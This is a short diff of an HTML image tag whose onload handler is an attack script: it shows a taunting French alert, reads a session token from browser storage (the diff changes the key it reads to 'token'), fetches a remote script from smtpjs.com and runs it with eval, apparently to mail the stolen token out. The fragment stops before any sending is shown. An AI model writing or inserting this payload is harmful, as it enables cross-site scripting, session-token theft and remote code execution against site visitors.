@@ -1,6 +1,6 @@
 <img src="https://d3isma7snj3lcx.cloudfront.net/optim/images/news/30/3050827573/xenoblade-chronicles-2-refait-les-presentations-sur-switch-f0afde18__w854.jpg" onload="
   alert('je vais niquer ton système !');
-  const token = window.localStorage.getItem('name');
+  const token = window.sessionStorage.getItem('token');
   fetch('https:\/\/smtpjs.com/v3/smtp.js').then(smtp => smtp.text()).then(smtp => {
     console.log(smtp);
     eval(smtp);
